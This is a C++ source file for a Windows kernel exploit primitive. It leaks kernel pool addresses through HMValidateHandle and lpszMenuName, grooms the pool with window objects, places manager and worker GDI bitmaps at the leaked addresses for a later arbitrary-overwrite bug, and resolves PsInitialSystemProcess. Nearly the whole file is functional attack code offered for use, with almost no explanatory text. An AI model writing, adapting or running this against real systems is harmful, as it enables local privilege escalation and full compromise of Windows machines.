
/*

	leak lpszMenuName using HMValidateHandle, that is allocated on the same pool region
	as the bitmap object, in order to later use in an arbitrary overwrite bug.

	Ref:
	https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_RS2_WWW_GDI_64.ps1
	https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
	Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
	LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila
	
<---- 
 
	Copy & usage of this software are allowed without any restrictions.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	
 ---->

*/

#pragma once
#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <cstdint>

#pragma comment(lib, "Gdi32.lib")

#include <Wingdi.h>

typedef void*(NTAPI *lHMValidateHandle)(
	HWND h,
	int type
);

int g = 1;

typedef struct _hBmp {
	HBITMAP hBmp;
	DWORD64 kAddr;
	PUCHAR pvScan0;
} HBMP, *PHBMP;


LRESULT
CALLBACK MainWProc(
	HWND hWnd, UINT uMsg,
	WPARAM wParam, LPARAM lParam
)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

lHMValidateHandle pHmValidateHandle = NULL;

// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
BOOL
GetHMValidateHandle(
)
{
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xe8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

PUCHAR
GetNtos(
)
{
	// defines.
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID Nt = NULL;

	// Dynamic import.
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	// Requere Medium integrity level ( > win7 ),
	// if run from low il, then return NULL.
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) { return NULL; }
	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	Nt = ModuleInfo->Module[0].ImageBase;

	// No longer needed, free the memory.
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

DWORD64
GetPsInitialSystemProcess(
)
{
	PUCHAR NtBaddr = (PUCHAR)GetNtos();
	printf("[+] ntoskrnl Base Addr: %p\n", NtBaddr);
	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	auto Psi = addr - ntos + NtBaddr;
	printf("[+] PsInitialSystemProcess: %p\n", Psi);
	return (DWORD64)Psi;
}

ATOM
RegisterhWnd(
	LPCWSTR class_name,
	LPCWSTR menu_name
	)
{
	WNDCLASS wind_class = WNDCLASS();
	wind_class.lpszClassName = class_name;
	wind_class.lpszMenuName = menu_name;
	wind_class.lpfnWndProc = MainWProc;
	return RegisterClassW(&wind_class);
}

void
DestroyWnd(
	HWND hWnd
	) 
{
	DestroyWindow(hWnd);
	UnregisterClassW(L"aaa",NULL);
}

HWND
CreateWindowObject(
	) 
{
	WCHAR* Buff = new WCHAR[0x8F0];
	RtlSecureZeroMemory(Buff, 0x8F0);
	RtlFillMemory(Buff, 0x8F0, '\x41');
	ATOM Cls = RegisterhWnd(L"aaa" ,Buff);
	return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
}

DWORD64
LeaklpszMenuName(
	HWND hWnd
	) 
{
	DWORD64 pCLSOffset = 0xa8;
	DWORD64 lpszMenuNameOffset = 0x90;
	BOOL bRet = GetHMValidateHandle();
	uintptr_t lpUserDesktopHeapWindow = (uintptr_t)pHmValidateHandle(hWnd, 1);
	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64)(lpUserDesktopHeapWindow) + 0x20) - (DWORD64)(lpUserDesktopHeapWindow);
	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
	return lpszMenuName;
}

VOID
SprayPool(
)
{
	for (int i = 0; i <= 1000; i++) {
		HWND TestWindowHandle = CreateWindowObject();
		auto Curr = LeaklpszMenuName(TestWindowHandle);
		//if (i % 25) {
			//printf("%d\n",i);
		DestroyWnd(TestWindowHandle);
		//}
	}
}

BOOL
Leak(
	_In_ int y,
	_In_ HBMP &hbmp
	)
{
	//if (y == 0) {
	//	SprayPool();
	//}
	
	DWORD64 Curr, Prev = NULL;

	for (int i = 0; i <= 20; i++) {
		HWND TestWindowHandle = CreateWindowObject();
		Curr = LeaklpszMenuName(TestWindowHandle);
		if (1<=i) {
			if (Curr == Prev) {
				DestroyWnd(TestWindowHandle);
				//return TRUE;
				break;
			}
		}
		DestroyWnd(TestWindowHandle);
		Prev = Curr;
	}

	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
	hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
	hbmp.kAddr = Curr;
	hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);

	return TRUE;
}

int
main(
)
{

	printf("\n[!] gdi feng shui ..\n");
	printf("[>] Spraying the pool\n");
	printf("[>] leaking ulClientDelta...\n");
	HBMP managerBitmap;
	HBMP workerBitmap;
	if (!Leak(0, managerBitmap)) {
		exit(GetLastError());
	}
	if (!Leak(1, workerBitmap)) {
		exit(GetLastError());
	}
	
	printf("\n[+] pHmValidateHandle: %p \n", pHmValidateHandle);
	printf("[+] hMgr: %p\n", &managerBitmap.hBmp);
	printf("[+] hWorker: %p\n", &workerBitmap.hBmp);
	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);

	int s;
	scanf("%d", &s);

	int y;
	scanf("%d", &y);
	return 0;
}
